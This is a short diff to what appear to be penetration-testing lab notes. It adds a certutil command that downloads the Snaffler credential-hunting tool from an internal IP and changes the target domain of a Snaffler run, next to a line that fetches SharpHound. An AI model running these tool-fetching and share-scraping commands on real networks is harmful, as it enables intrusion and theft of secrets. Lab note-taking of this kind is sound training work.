@@ -6,7 +6,8 @@ iwr $ip/SharpHound.exe -o SharpHound.exe
 ```
 
 ```powershell
-.\Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
+certutil.exe -urlcache -split -f http://172.16.139.10:7070/Snaffler.exe Snaffler.exe
+.\Snaffler.exe -s -d trilocor.local -o snaffler.log -v data
 ```
 
 ```powershell
